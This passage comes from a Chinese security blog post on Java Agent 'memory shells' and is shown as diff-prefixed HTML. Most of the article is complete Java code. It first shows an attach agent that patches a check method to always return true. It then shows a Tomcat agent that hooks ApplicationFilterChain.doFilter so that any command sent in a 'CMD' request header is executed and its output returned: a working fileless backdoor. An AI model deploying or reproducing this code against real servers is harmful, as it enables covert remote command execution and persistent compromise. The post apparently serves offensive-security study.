class="line">                System.out.println(<span class="string">&quot;running false...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建Agent类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttachAgent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">MyTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (loadedClass.getName() == <span class="string">&quot;Test&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inst.retransformClasses(loadedClass);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;running JVM...&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptorList = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : virtualMachineDescriptorList) &#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 由于要保持字段数不变, 无法增加新字段, 重写checkFlag方法</span></span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">checkFlag</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;checkFlag&quot;</span>);</span><br><span class="line">                checkFlag.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;Attach successfully...\&quot;);return true;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>配置MANIFEST.MF文件</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: vm.AttachAgent</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713750379102-886c7ab5-3604-456f-86ca-3218aef5231c.png" alt="image.png"></p>
+<h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><p>根据Java Agent的实现原理，Agent内存马实现的思路就是找一个比较通用的类，保证每一次request请求都能调用到它的某一个方法, 然后利用javaassist插入恶意Java代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatAgent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Agentmain...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TomcatTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (loadedClass.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inst.retransformClasses(loadedClass);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Running JVM...&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptorList = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : virtualMachineDescriptorList) &#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().contains(<span class="string">&quot;org.apache.catalina.startup.Bootstrap&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">                System.out.println(<span class="string">&quot;Attach successfully...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TomcatTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">classClassPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(classClassPath);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">            method.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd = httpServletRequest.getHeader(\&quot;CMD\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    Process process = Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    java.io.InputStream input = process.getInputStream();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    StringBuilder sb = new StringBuilder();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    String line = null;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    while ((line = br.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        sb.append(line + \&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    br.close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    input.close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713772672628-3c77b64c-f2f0-47b7-b9ce-14d7e779c847.png" alt="image.png"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Agent"><span class="toc-number">2.</span> <span class="toc-text">Java Agent</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%97%B6"><span class="toc-number">2.1.</span> <span class="toc-text">启动时</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">基础概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">测试示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%97%B6"><span class="toc-number">2.2.</span> <span class="toc-text">运行时</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">基础概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">测试示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">Java Agent内存马</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&text=MemoryShell Of Agent"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=MemoryShell Of Agent"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MemoryShell Of Agent&body=Check out this article: https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&name=MemoryShell Of Agent&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&t=MemoryShell Of Agent"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2023-2025
+        H3rmesk1t
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/tags/">Tag</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = '💬';
+      var utterances_theme = 'github-light';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
